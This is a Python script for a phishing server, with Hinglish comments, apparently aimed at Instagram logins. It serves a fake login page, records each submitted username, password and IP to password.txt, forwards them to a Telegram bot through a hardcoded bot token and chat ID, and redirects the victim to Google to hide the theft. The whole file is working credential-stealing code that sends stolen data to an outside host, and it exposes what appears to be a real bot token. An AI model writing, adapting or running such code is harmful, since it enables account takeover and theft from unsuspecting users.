from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime
import socket
import os
import subprocess
import time
import requests  # Telegram ke liye

HOST = '0.0.0.0'  # Sab IPs se accept karega
PORT = 5052

# Telegram bot token aur chat id yahan daalo
TELEGRAM_BOT_TOKEN = "5154193675:AAE2sU4FJe_RLIHopHxFD2799pgR9XTi80U"
TELEGRAM_CHAT_ID = "5071094116"

def kill_existing_process_on_port(port):
    try:
        # Linux-specific command to find process on port
        result = subprocess.run(["fuser", f"{port}/tcp"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        output = result.stdout.decode().strip()
        if output:
            for pid in output.split():
                os.kill(int(pid), 9)
            print(f"[!] Killed process(es) on port {port}: {' '.join(output.split())}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] Error while killing process on port: {e}")

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"[!] Telegram message send error: {e}")

class SimpleHandler(BaseHTTPRequestHandler):

    def get_client_ip(self):
        # Proxy ya load balancer ke through aaye IP ke liye header check karo
        x_forwarded_for = self.headers.get('X-Forwarded-For')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0].strip()  # Agar multiple IPs hain to pehla lo
        else:
            ip = self.client_address[0]
        return ip

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            try:
                with open('index.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, 'index.html not found')
        else:
            self.send_error(404, 'Page not found')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = urllib.parse.parse_qs(post_data)

        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]

        ip = self.get_client_ip()
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        log_entry = (
            f"Date: {now}\n"
            f"IP: {ip}\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
            "------------------------\n"
        )

        # Save locally
        with open('password.txt', 'a') as log_file:
            log_file.write(log_entry)

        # Send to Telegram
        telegram_message = (
            f"*New Credentials Captured insta*\n"
            f"Date: {now}\n"
            f"IP: {ip}\n"
            f"Username: {username}\n"
            f"Password: {password}"
        )
        send_telegram_message(telegram_message)

        # Redirect user
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com/')
        self.end_headers()

class ReusableHTTPServer(HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

if __name__ == "__main__":
    kill_existing_process_on_port(PORT)
    print(f"[+] Server started at http://{HOST}:{PORT}")
    server = ReusableHTTPServer((HOST, PORT), SimpleHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
        server.server_close()

